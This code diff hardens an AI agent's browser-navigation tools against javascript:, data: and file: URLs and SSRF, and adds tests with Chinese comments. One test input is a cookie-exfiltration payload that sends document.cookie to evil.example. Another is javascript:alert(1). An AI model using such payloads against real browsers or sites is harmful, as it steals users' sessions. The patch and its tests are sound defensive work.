@@ -219,11 +219,19 @@ impl BrowserPtcHandler {
         output: &mut Vec<String>,
     ) -> Result<String, String> {
         match step {
-            PtcStep::Navigate { url } => backend
-                .navigate_with_wait(url, std::time::Duration::from_secs(30))
-                .await
-                .map(|_| format!("navigated: {url}"))
-                .map_err(|e| e.to_string()),
+            PtcStep::Navigate { url } => {
+                // 与 browser_navigate 同一道闸：ptc 是 Dangerous 档（审批
+                // 覆盖），但审批挡不住已批准程序内的 `javascript:` URL——
+                // 机器校验在先，审批是第二道而非唯一一道。
+                if let Err(reason) = check_navigable_url(url) {
+                    return Err(format!("URL 被拒绝：{reason}"));
+                }
+                backend
+                    .navigate_with_wait(url, std::time::Duration::from_secs(30))
+                    .await
+                    .map(|_| format!("navigated: {url}"))
+                    .map_err(|e| e.to_string())
+            }
             PtcStep::Snapshot {
                 target,
                 compact,
@@ -692,6 +700,24 @@ fn session_from_params(params: &Value) -> &str {
 }
 
 // ---------------------------------------------------------------------------
+// Navigable-URL gate（修 1：注入面防护）
+// ---------------------------------------------------------------------------
+
+/// `browser_navigate` 与 `browser_ptc` 的 Navigate 步骤共用的 URL 校验。
+/// SsrfGuard 的 scheme gate 只放行 http/https，但 `about:blank` 没有
+/// host 会被"URL has no host"误杀——它是浏览器自动化的合法起点，
+/// 在 guard 之前精确放行。`javascript:` / `data:` / `file:` 由
+/// SsrfGuard 的 ForbiddenScheme 拒绝，无例外。
+pub(crate) fn check_navigable_url(url: &str) -> Result<(), String> {
+    if url.trim().eq_ignore_ascii_case("about:blank") {
+        return Ok(());
+    }
+    SsrfGuard::new()
+        .check(url)
+        .map_err(|v| v.to_string())
+}
+
+// ---------------------------------------------------------------------------
 // BrowserNavigateHandler
 // ---------------------------------------------------------------------------
 
@@ -767,14 +793,14 @@ impl ToolHandler for BrowserNavigateHandler {
                 return cdp_bootstrap::status_to_tool_result(&status);
             }
         }
-        // SSRF pre-check (see `web::WebExtractHandler::execute`
-        // for the rationale). The browser is the highest-risk
-        // vector: a successful navigate to a private address gives
-        // the LLM both the cookies/storage of that session and
-        // the ability to submit forms.
-        if let Some(guard) = &self.ssrf_guard {
-            if let Err(v) = guard.check(url) {
-                return Err(ToolError::ExecutionFailed(v.to_string()));
+        // SSRF pre-check（see `web::WebExtractHandler::execute`
+        // for the rationale）+ navigable scheme gate。The browser is
+        // the highest-risk vector: a successful navigate to a private
+        // address gives the LLM both the cookies/storage of that
+        // session and the ability to submit forms.
+        if self.ssrf_guard.is_some() {
+            if let Err(reason) = check_navigable_url(url) {
+                return Err(ToolError::ExecutionFailed(reason));
             }
         }
         //domain allowlist check via the registry. We do this
@@ -1783,6 +1809,40 @@ mod tests {
         assert!(empty.contains("steps 为空"));
     }
 
+    #[tokio::test]
+    async fn test_browser_ptc_navigate_step_blocks_javascript_url() {
+        // ptc 的 Navigate 步骤直连 backend 原本绕过 SsrfGuard——
+        // 审批挡不住已批准程序内的 javascript: URL。步骤级 gate 必须拒绝。
+        let handler = BrowserPtcHandler::new(backend());
+        let result = handler
+            .execute(json!({
+                "steps": [
+                    {"op": "navigate", "url": "javascript:alert(1)"},
+                    {"op": "emit", "value": "never"}
+                ]
+            }))
+            .await
+            .unwrap();
+        let parsed: Value = serde_json::from_str(&result).unwrap();
+        assert!(parsed["error"].as_str().unwrap().contains("URL 被拒绝"));
+        // fail-fast：第一步就拒，后续步骤不执行
+        let done = parsed["steps_completed"].as_array().unwrap();
+        assert_eq!(done.len(), 1);
+        assert_eq!(done[0]["status"], "error");
+    }
+
+    #[tokio::test]
+    async fn test_browser_ptc_navigate_step_allows_about_blank() {
+        let handler = BrowserPtcHandler::new(backend());
+        let result = handler
+            .execute(json!({"steps": [{"op": "navigate", "url": "about:blank"}]}))
+            .await
+            .unwrap();
+        let parsed: Value = serde_json::from_str(&result).unwrap();
+        assert_eq!(parsed["status"], "ok");
+        assert_eq!(parsed["steps"][0]["status"], "ok");
+    }
+
     // -- SSRF pre-check -------------------------------------------------
     // Browser-navigate is the highest-risk surface: a successful
     // navigate gives the LLM both session cookies/storage and
@@ -1823,6 +1883,30 @@ mod tests {
             .await
             .unwrap_err();
         assert!(err.to_string().contains("forbidden_scheme"));
+    }
+
+    #[tokio::test]
+    async fn test_browser_navigate_blocks_javascript_scheme() {
+        // `javascript:` URL 在 Safe 档下不弹审批——必须被入口校验拒绝，
+        // 这是"压根不该执行"而非"该不该审批"的问题。
+        let handler = BrowserNavigateHandler::new(backend());
+        let err = handler
+            .execute(json!({"url": "javascript:document.location='http://evil.example/steal?c='+document.cookie"}))
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("forbidden_scheme"));
+    }
+
+    #[tokio::test]
+    async fn test_browser_navigate_allows_about_blank() {
+        // about:blank 无 host，SsrfGuard 的 host 检查会误杀——它是
+        // 浏览器自动化的合法起点，必须在 gate 里精确放行。
+        let handler = BrowserNavigateHandler::new(backend());
+        let result = handler
+            .execute(json!({"url": "about:blank"}))
+            .await
+            .unwrap();
+        assert!(result.contains("about:blank"));
     }
 
     #[tokio::test]
